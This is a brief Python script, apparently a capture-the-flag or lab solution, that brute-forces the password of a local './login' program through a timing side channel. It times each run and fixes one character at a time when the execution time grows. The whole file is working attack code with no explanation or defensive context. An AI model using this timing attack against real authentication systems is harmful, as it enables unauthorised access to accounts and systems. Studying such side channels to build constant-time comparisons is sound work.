import subprocess
from math import isclose
import time
import numpy as np


chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,./<>?;\':\"[]\\{}|`~!@#$%^&*()_+-="

base_time = 1
string = ["$" for i in range(31)]

start = time.time()
subprocess.run(["./login", "".join(string), "2500000000"])
end = time.time()

base_time = round(end-start)

print("Base Time for 31 digits: ", base_time)

new_time = 1
for i in range(31):
	for j in chars:
		string[i] = j
		print("\t", "".join(string))
		start = time.time()
		subprocess.run(["./login", "".join(string), "2500000000"])
		end = time.time()
		new_time = round(end-start)
		print(base_time*(i+2),new_time, j)
		if new_time == base_time*(i+2):
			print("Found: ", base_time*(i+2),new_time)
			break


